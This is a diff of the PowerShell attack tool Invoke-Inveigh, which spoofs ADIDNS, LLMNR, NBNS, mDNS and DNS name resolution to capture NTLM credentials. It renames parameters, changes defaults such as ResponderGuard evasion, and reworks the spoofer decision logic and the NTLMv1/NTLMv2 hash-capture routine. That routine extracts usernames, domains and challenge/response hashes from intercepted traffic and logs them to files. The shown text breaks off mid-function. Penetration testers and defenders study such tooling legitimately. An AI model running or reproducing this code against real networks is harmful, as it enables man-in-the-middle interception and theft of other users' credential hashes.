@@ -2,16 +2,16 @@ function Invoke-Inveigh
 {
 <#
 .SYNOPSIS
-This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS spoofer.
+This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer.
 
 .DESCRIPTION
-This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS spoofer/man-in-the-middle tool with
+This function is a Windows PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS spoofer/man-in-the-middle tool with
 challenge/response capture over HTTP/HTTPS/Proxy/SMB.
 
 .PARAMETER ADIDNS
 Default = None: (Combo/NS/Wildcard) List of ADIDNS spoofing attacks. Combo looks at LLMNR/NBNS requests and adds
 a record to DNS if the same request is received from multiple systems. NS injects an NS record and if needed, a target record.
-this is primarily for the GQBL bypass for wpad. This attack can be used with Inveigh's DNS spoofer. Wildcard injects a wildcard record.
+This is primarily for the GQBL bypass for wpad. This attack can be used with Inveigh's DNS spoofer. Wildcard injects a wildcard record.
 
 .PARAMETER ADIDNSACE
 Default = Enabled: Enable/Disable adding an 'Authenticated Users' full control ACE to any added records.
@@ -32,7 +32,7 @@ Domain controller to target. This parameter is mandatory on a non-domain attache
 The targeted forest in DNS format.
 
 .PARAMETER ADIDNSHostsIgnore
-Comma seperated list of hosts that will be ignored with ADIDNS spoofing.
+Comma separated list of hosts that will be ignored with ADIDNS spoofing.
 
 .PARAMETER ADIDNSNSTarget
 Default = wpad2: Target for the NS attacks NS record. An existing record can be used. 
@@ -77,12 +77,12 @@ This is primarily required for the ADIDNS NS wpad attack.
 .PARAMETER DNSTTL
 Default = 30 Seconds: DNS TTL in seconds for the response packet.
 
-.PARAMETER ElevatedPrivilege
+.PARAMETER Elevated
 Default = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if Inveigh is running with
 elevated privilege. If so, options that require elevated privilege can be used.
 
 .PARAMETER EvadeRG
-Defauly = Enabled: (Y/N) Enable/Disable detecting and ignoring LLMNR/NBNS requests sent directly to an IP address
+Defauly = Disabled: (Y/N) Enable/Disable detecting and ignoring LLMNR/NBNS requests sent directly to an IP address
 rather than a broadcast/multicast address. This technique is used by ResponderGuard to discover spoofers across
 subnets.
 
@@ -117,19 +117,19 @@ Realm name for Basic authentication. This parameter applies to both HTTPAuth and
 Default = text/html: Content type for HTTP/HTTPS/Proxy responses. Does not apply to EXEs and wpad.dat. Set to
 "application/hta" for HTA files or when using HTA code with HTTPResponse.
 
-.PARAMETER HTTPDir
+.PARAMETER HTTPDirectory
 Full directory path to enable hosting of basic content through the HTTP/HTTPS listener.
 
 .PARAMETER HTTPDefaultFile
-Filename within the HTTPDir to serve as the default HTTP/HTTPS/Proxy response file. This file will not be used for
+Filename within the HTTPDirectory to serve as the default HTTP/HTTPS/Proxy response file. This file will not be used for
 wpad.dat requests.
 
 .PARAMETER HTTPDefaultEXE
-EXE filename within the HTTPDir to serve as the default HTTP/HTTPS/Proxy response for EXE requests. 
+EXE filename within the HTTPDirectory to serve as the default HTTP/HTTPS/Proxy response for EXE requests. 
 
 .PARAMETER HTTPResponse
 Content to serve as the default HTTP/HTTPS/Proxy response. This response will not be used for wpad.dat requests.
-This parameter will not be used if HTTPDir is set. Use PowerShell character escapes and newlines where necessary.
+This parameter will not be used if HTTPDirectory is set. Use PowerShell character escapes and newlines where necessary.
 
 .PARAMETER HTTPS
 Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
@@ -174,7 +174,7 @@ realm (e.g., TEST.LOCALhostwks1.test.local)
 AES256 password hash that will be used to decrypt Kerberos TGT captures. This is not required if using KerberosCredential.
 
 .PARAMETER KerberosHostHeader
-Comma seperated list of hosts that the HTTP/HTTPS/Proxy listener will compare to host headers. If a match is found, the
+Comma separated list of hosts that the HTTP/HTTPS/Proxy listener will compare to host headers. If a match is found, the
 listener will attempt to negotiate to Kerberos.
 
 .PARAMETER LogOutput
@@ -219,7 +219,7 @@ IP address to target for NBNS brute force spoofing.
 Default = 165 Seconds: NBNS TTL in seconds for the response packet.
 
 .PARAMETER NBNSTypes
-Default = 00,20: Comma separated list of NBNS types to spoof.
+Default = 00,20: Comma separated list of NBNS types to spoof. Note, not all types have been tested.
 Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name
 
 .PARAMETER OutputStreamOnly
@@ -231,11 +231,11 @@ yellow warning messages if enabled.
 Default = Disabled: (File/Memory) Enable/Disable dumping packets to a pcap file or memory. This option requires
 elevated privilege. If using 'Memory', the packets will be written to the $inveigh.pcap ArrayList.
 
-.PARAMETER PcapPortTCP
+.PARAMETER PcapTCP
 Default = 139,445: Comma separated list of TCP ports to filter which packets will be written to the pcap file.
 Use 'All' to capture on all ports.
 
-.PARAMETER PcapPortUDP
+.PARAMETER PcapUDP
 Default = Disabled: Comma separated list of UDP ports to filter which packets will be written to the pcap file.
 Use 'All' to capture on all ports.
 
@@ -274,20 +274,20 @@ direct targets to the host system's SMB server. Block TCP ports 445/139 or kill 
 prevent login requests from being processed by the Inveigh host.  
 
 .PARAMETER SpooferHostsIgnore
-Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR/mDNS/NBNS.
+Comma separated list of requested hostnames to ignore when spoofing with LLMNR/mDNS/NBNS.
 
 .PARAMETER SpooferHostsReply
-Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR/mDNS/NBNS.
+Comma separated list of requested hostnames to respond to when spoofing with LLMNR/mDNS/NBNS.
 
 .PARAMETER SpooferIP
 IP address for ADIDNS/LLMNR/mDNS/NBNS spoofing. This parameter is only necessary when redirecting victims to a system
 other than the Inveigh host.
 
 .PARAMETER SpooferIPsIgnore
-Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR/mDNS/NBNS.
+Comma separated list of source IP addresses to ignore when spoofing with LLMNR/mDNS/NBNS.
 
 .PARAMETER SpooferIPsReply
-Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR/mDNS/NBNS.
+Comma separated list of source IP addresses to respond to when spoofing with LLMNR/mDNS/NBNS.
 
 .PARAMETER SpooferLearning
 Default = Disabled: (Y/N) Enable/Disable LLMNR/NBNS valid host learning. If enabled, Inveigh will send out
@@ -318,7 +318,7 @@ requests.
 responding to those requests. 
 
 .PARAMETER StartupChecks
-Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.
+Default = Disabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.
 
 .PARAMETER StatusOutput
 Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
@@ -372,7 +372,7 @@ Execute with the stealthiest options.
 
 .EXAMPLE
 Invoke-Inveigh -Inspect
-Execute in order to only inpect LLMNR/mDNS/NBNS traffic.
+Execute in order to only inspect LLMNR/mDNS/NBNS traffic.
 
 .EXAMPLE
 Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
@@ -396,8 +396,8 @@ param
     [parameter(Mandatory=$false)][Array]$ADIDNSHostsIgnore = ("isatap","wpad"),
     [parameter(Mandatory=$false)][Array]$KerberosHostHeader = "",
     [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
-    [parameter(Mandatory=$false)][Array]$PcapPortTCP = ("139","445"),
-    [parameter(Mandatory=$false)][Array]$PcapPortUDP = "",
+    [parameter(Mandatory=$false)][Array]$PcapTCP = ("139","445"),
+    [parameter(Mandatory=$false)][Array]$PcapUDP = "",
     [parameter(Mandatory=$false)][Array]$SpooferHostsReply = "",
     [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore = "",
     [parameter(Mandatory=$false)][Array]$SpooferIPsReply = "",
@@ -467,9 +467,9 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferNonprintable = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferRepeat = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$ElevatedPrivilege = "Auto",
+    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$Elevated = "Auto",
     [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$HTTPAuth = "NTLM",
     [parameter(Mandatory=$false)][ValidateSet("QU","QM")][Array]$mDNSTypes = @("QU"),
     [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$NBNSTypes = @("00","20"),
@@ -479,7 +479,7 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$WPADAuth = "NTLM",
     [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$KerberosHash,
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
-    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDir = "",
+    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDirectory = "",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = "",
     [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NBNSBruteForceTarget = "",
@@ -500,7 +500,7 @@ if($invalid_parameter)
     throw
 }
 
-$inveigh_version = "1.5 Dev"
+$inveigh_version = "1.506"
 
 if(!$IP)
 { 
@@ -565,7 +565,7 @@ if($ADIDNS)
 if($HTTPDefaultFile -or $HTTPDefaultEXE)
 {
 
-    if(!$HTTPDir)
+    if(!$HTTPDirectory)
     {
         Write-Output "[-] You must specify an -HTTPDir when using either -HTTPDefaultFile or -HTTPDefaultEXE"
         throw
@@ -674,14 +674,14 @@ if(!$inveigh.relay_running)
     $inveigh.POST_request_out_file = $output_directory + "\Inveigh-FormInput.txt"
 }
 
-if($ElevatedPrivilege -eq 'Auto')
+if($Elevated -eq 'Auto')
 {
     $elevated_privilege = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 }
 else
 {
  
-    if($ElevatedPrivilege -eq 'Y')
+    if($Elevated -eq 'Y')
     {
         $elevated_privilege_check = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
         $elevated_privilege = $true
@@ -872,10 +872,10 @@ catch
 #region begin startup messages
 $inveigh.output_queue.Add("[*] Inveigh $inveigh_version started at $(Get-Date -format s)") > $null
 
-if($ElevatedPrivilege -eq 'Y' -or $elevated_privilege)
+if($Elevated -eq 'Y' -or $elevated_privilege)
 {
 
-    if(($ElevatedPrivilege -eq 'Auto' -and $elevated_privilege) -or ($ElevatedPrivilege -eq 'Y' -and $elevated_privilege_check))
+    if(($Elevated -eq 'Auto' -and $elevated_privilege) -or ($Elevated -eq 'Y' -and $elevated_privilege_check))
     {
         $inveigh.output_queue.Add("[+] Elevated Privilege Mode = Enabled")  > $null
     }
@@ -982,7 +982,6 @@ if($DNS -eq 'Y')
 else
 {
     $inveigh.output_queue.Add("[+] DNS Spoofer = Disabled")  > $null
-    $DNS_response_message = "[spoofer disabled]"
 }
 
 if($LLMNR -eq 'Y')
@@ -1003,7 +1002,6 @@ if($LLMNR -eq 'Y')
 else
 {
     $inveigh.output_queue.Add("[+] LLMNR Spoofer = Disabled")  > $null
-    $LLMNR_response_message = "[spoofer disabled]"
 }
 
 if($mDNS -eq 'Y')
@@ -1034,7 +1032,6 @@ if($mDNS -eq 'Y')
 else
 {
     $inveigh.output_queue.Add("[+] mDNS Spoofer = Disabled")  > $null
-    $mDNS_response_message = "[spoofer disabled]"
 }
 
 if($NBNS -eq 'Y')
@@ -1054,7 +1051,6 @@ if($NBNS -eq 'Y')
 else
 {
     $inveigh.output_queue.Add("[+] NBNS Spoofer = Disabled")  > $null
-    $NBNS_response_message = "[spoofer disabled]"
 }
 
 if($NBNSBruteForce -eq 'Y')
@@ -1277,9 +1273,9 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
 {
     $inveigh.output_queue.Add("[+] HTTP/HTTPS Authentication = $HTTPAuth")  > $null
 
-    if($HTTPDir -and !$HTTPResponse)
+    if($HTTPDirectory -and !$HTTPResponse)
     {
-        $inveigh.output_queue.Add("[+] HTTP/HTTPS Directory = $HTTPDir")  > $null
+        $inveigh.output_queue.Add("[+] HTTP/HTTPS Directory = $HTTPDirectory")  > $null
 
         if($HTTPDefaultFile)
         {
@@ -1298,7 +1294,7 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
         $inveigh.output_queue.Add("[+] HTTP/HTTPS Response = Enabled")  > $null
     }
 
-    if($HTTPResponse -or $HTTPDir -and $HTTPContentType -ne 'html/text')
+    if($HTTPResponse -or $HTTPDirectory -and $HTTPContentType -ne 'html/text')
     {
         $inveigh.output_queue.Add("[+] HTTP/HTTPS/Proxy Content Type = $HTTPContentType")  > $null
     }
@@ -1418,7 +1414,7 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
 
     if($Challenge)
     {
-        $inveigh.output_queue.Add("[+] NTLM Challenge = $Challenge")  > $null
+        $inveigh.output_queue.Add("[+] HTTP NTLM Challenge = $Challenge")  > $null
     }
 
 }
@@ -1502,7 +1498,7 @@ else
     $inveigh.console_unique = $false
 }
 
-if($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($Pcap -eq 'File' -and ($PcapPortTCP -or $PcapPortUDP)))
+if($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($Pcap -eq 'File' -and ($PcapTCP -or $PcapUDP)))
 {
     
     if($FileOutput -eq 'Y')
@@ -1515,14 +1511,14 @@ if($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($P
     {
         $inveigh.output_queue.Add("[+] Pcap Output = File") > $null
         
-        if($PcapPortTCP)
+        if($PcapTCP)
         {
-            $inveigh.output_queue.Add("[+] Pcap TCP Ports = " + ($PcapPortTCP -join ","))  > $null
+            $inveigh.output_queue.Add("[+] Pcap TCP Ports = " + ($PcapTCP -join ","))  > $null
         }
 
-        if($PcapPortUDP)
+        if($PcapUDP)
         {
-            $inveigh.output_queue.Add("[+] Pcap UDP Ports = " + ($PcapPortUDP -join ","))  > $null
+            $inveigh.output_queue.Add("[+] Pcap UDP Ports = " + ($PcapUDP -join ","))  > $null
         }
 
     }
@@ -1703,15 +1699,29 @@ $shared_basic_functions_scriptblock =
 
     function Get-SpooferResponseMessage
     {
-        param ([String]$QueryString,[String]$Type,[String]$mDNSType)
+        param ([String]$QueryString,[String]$Type,[String]$mDNSType,[String]$Enabled,[byte]$NBNSType)
+
+        if($QueryString -like "*.*")
+        {
+            [Array]$query_split = $QueryString.Split('.')
+            $query_host = $query_split[0]
+        }
 
         $response_type = "[+]"
 
-        if($SpooferHostsReply -and $SpooferHostsReply -notcontains $QueryString)
+        if($Inspect)
+        {
+            $response_message = "[inspect only]"
+        }
+        elseif($Enabled -eq 'N')
+        {
+            $response_message = "[spoofer disabled]"
+        }
+        elseif($SpooferHostsReply -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))
         {
             $response_message = "[$QueryString not on reply list]"
         }
-        elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $QueryString)
+        elseif($SpooferHostsIgnore -contains $QueryString -or $SpooferHostsIgnore -contains $query_host)
         {
             $response_message = "[$QueryString is on ignore list]"
         }
@@ -1719,59 +1729,58 @@ $shared_basic_functions_scriptblock =
         {
             $response_message = "[$source_IP not on reply list]"
         }
-        elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
+        elseif($SpooferIPsIgnore -contains $source_IP)
         {
             $response_message = "[$source_IP is on ignore list]"
         }
-        elseif($inveigh.valid_host_list -contains $query_string)
+        elseif($inveigh.valid_host_list -contains $query_string -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))
         {
             $response_message = "[$query_string is a valid host]"
         }
-        elseif($inveigh.IP_capture_list -contains $source_IP.IPAddressToString)
+        elseif($SpooferRepeat -eq 'Y' -and $inveigh.IP_capture_list -contains $source_IP.IPAddressToString)
         {
             $response_message = "[previous $source_IP capture]"
         }
-        elseif($source_IP.IPAddressToString -eq $IP)
+        elseif($Type -eq 'NBNS' -and $source_IP.IPAddressToString -eq $IP)
         {
-            $response_message = "[local request ignored]"
+            $response_message = "[local query]"
         }
-        elseif($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)
+        elseif($SpooferLearning -eq 'Y' -or $SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)
         {
             $response_message = ": " + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
-        }
-        elseif($Type -ne 'mDNS' -and $destination_IP.IPAddressToString -eq $IP)
-        {
-            $response_message = "[possible ResponderGuard request ignored]"
-            $response_type = "[!]"
         }
         elseif($Type -eq 'NBNS' -and $NBNSTypes -notcontains $NBNS_query_type)
         {
             $response_message = "[NBNS type disabled]"
         }
-        elseif($Type -eq 'NBNS' -and $QueryString.Trim() -eq '*')
+        elseif($Type -eq 'NBNS' -and $NBNSType -eq 33)
         {
             $response_message = "[NBSTAT request]"
+        }
+        elseif($EvadeRG -eq 'Y' -and $Type -ne 'mDNS' -and $Type -ne 'DNS' -and $destination_IP.IPAddressToString -eq $IP)
+        {
+            $response_message = "[possible ResponderGuard request ignored]"
+            $response_type = "[!]"
         }
         elseif($Type -eq 'mDNS' -and $mDNSType -and $mDNSTypes -notcontains $mDNSType)
         {
             $response_message = "[mDNS type disabled]"
         }
-        elseif(@($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count -le $SpooferThresholdHost)
+        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdHost -gt 0 -and @($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count -le $SpooferThresholdHost)
         {
             $response_message = "[SpooferThresholdHost >= $(@($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count)]"
         }
-        elseif(@($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count -le $SpooferThresholdNetwork)
+        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdNetwork -gt 0 -and @($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count -le $SpooferThresholdNetwork)
         {
             $response_message = "[SpooferThresholdNetwork >= $(@($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count)]"
         }
-        elseif($QueryString -notmatch '[^\x00-\x7F]+')
+        elseif($QueryString -match '[^\x00-\x7F]+')
         {
             $response_message = "[nonprintable characters]"
         }
         else
         {
-            $response_message = "[something went wrong]"
-            $response_type = "[-]"
+            $response_message = "[response sent]"
         }
 
         return $response_type,$response_message
@@ -1786,6 +1795,16 @@ $shared_basic_functions_scriptblock =
             '41-41'
             {
                 $NBNS_query_type = "00"
+            }
+
+            '41-42'
+            {
+                $NBNS_query_type = "01"
+            }
+
+            '41-43'
+            {
+                $NBNS_query_type = "02"
             }
 
             '41-44'
@@ -1974,14 +1993,14 @@ $NTLM_functions_scriptblock =
 
     function Get-NTLMResponse
     {
-        param ([Byte[]]$Payload,[String]$SourceIP,[String]$SourcePort,[String]$Port,[String]$Protocol)
+        param ([Byte[]]$Payload,[String]$Capture,[String]$SourceIP,[String]$SourcePort,[String]$Port,[String]$Protocol)
 
         $payload_converted = [System.BitConverter]::ToString($Payload)
         $payload_converted = $payload_converted -replace "-",""
         $NTLMSSP_hex_offset = $payload_converted.IndexOf("4E544C4D53535000")
         $session = "$SourceIP`:$SourcePort"
 
-        if(($Protocol -Like "HTTP*" -or $NTLMSSP_hex_offset -gt 0) -and $payload_converted.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
+        if($NTLMSSP_hex_offset -ge 0 -and $payload_converted.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
         {
             $NTLMSSP_offset = $NTLMSSP_hex_offset / 2
             $LM_length = Get-UInt16DataLength ($NTLMSSP_offset + 12) $Payload
@@ -1992,7 +2011,12 @@ $NTLM_functions_scriptblock =
             $NTLM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
             $domain_length = Get-UInt16DataLength ($NTLMSSP_offset + 28) $Payload
             $domain_offset = Get-UInt32DataLength ($NTLMSSP_offset + 32) $Payload
-            $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload
+
+            if($domain_length -gt 0)
+            {
+                $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload
+            }
+
             $user_length = Get-UInt16DataLength ($NTLMSSP_offset + 36) $Payload
             $user_offset = Get-UInt32DataLength ($NTLMSSP_offset + 40) $Payload
             $NTLM_user_string = Convert-DataToString ($NTLMSSP_offset + $user_offset) $user_length $Payload
@@ -2004,97 +2028,135 @@ $NTLM_functions_scriptblock =
             {
                 $NTLM_challenge = $inveigh.SMB_session_table.$session
             }
-            elseif($Protocol -Like "HTTP*")
+            else
             {
                 $NTLM_challenge = $inveigh.HTTP_session_table.$session
             }
-
+            
             if($NTLM_length -gt 24)
             {
-                $NTLMv2_response = $NTLM_response.Insert(32,':')
-                $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
 
-                if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
+                if($NTLM_challenge)
                 {
-                    $inveigh.NTLMv2_list.Add($NTLMv2_hash) > $null
 
-                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
+                    $NTLMv2_response = $NTLM_response.Insert(32,':')
+                    $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
+
+                    if($Capture -eq 'Y')
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge/response captured from $session($NTLM_host_string)`:") > $null
-                        $inveigh.output_queue.Add($NTLMv2_hash) > $null
+
+                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
+                        {
+                            $inveigh.NTLMv2_list.Add($NTLMv2_hash) > $null
+
+                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
+                                $inveigh.output_queue.Add($NTLMv2_hash) > $null
+                            }
+                            else
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
+                            }
+
+                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
+                            {
+                                $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) > $null
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 written to " + "Inveigh-NTLMv2.txt") > $null
+                            }
+
+                            if($inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
+                            {
+                                $inveigh.NTLMv2_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
+                            }
+
+                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
+                            {
+                                $inveigh.IP_capture_list.Add($SourceIP) > $null
+                            }
+
+                        }
+                        else
+                        {
+                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
+                        }
+
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge/response captured from $session($NTLM_host_string)`:`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
-                    }
-
-                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
-                    {
-                        $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) > $null
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge/response written to " + "Inveigh-NTLMv2.txt") > $null
-                    }
-
-                    if($inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
-                    {
-                        $inveigh.NTLMv2_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
-                    }
-
-                    if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
-                    {
-                        $inveigh.IP_capture_list.Add($SourceIP) > $null
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
                     }
 
                 }
                 else
                 {
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge/response ignored from $session($NTLM_host_string)`:`n$NTLM_domain_string\$NTLM_user_string [machine account]") > $null    
+                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge missing for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort") > $null    
                 }
 
             }
             elseif($NTLM_length -eq 24)
             {
-                $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge
 
-                if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
+                if($NTLM_challenge)
                 {
-                    $inveigh.NTLMv1_list.Add($NTLMv1_hash) > $null
 
-                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
+                    $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge
+
+                    if($Capture -eq 'Y')
                     {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $session($NTLM_host_string)`:") > $null
-                        $inveigh.output_queue.Add($NTLMv1_hash) > $null
+
+                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
+                        {
+                            $inveigh.NTLMv1_list.Add($NTLMv1_hash) > $null
+
+                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
+                                $inveigh.output_queue.Add($NTLMv1_hash) > $null
+                            }
+                            else
+                            {
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
+                            }
+
+                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
+                            {
+                                $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash) > $null
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 written to " + "Inveigh-NTLMv1.txt") > $null
+                            }
+
+                            if($inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
+                            {
+                                $inveigh.NTLMv1_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
+                            }
+
+                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
+                            {
+                                $inveigh.IP_capture_list.Add($SourceIP) > $null
+                            }
+
+                        }
+                        else
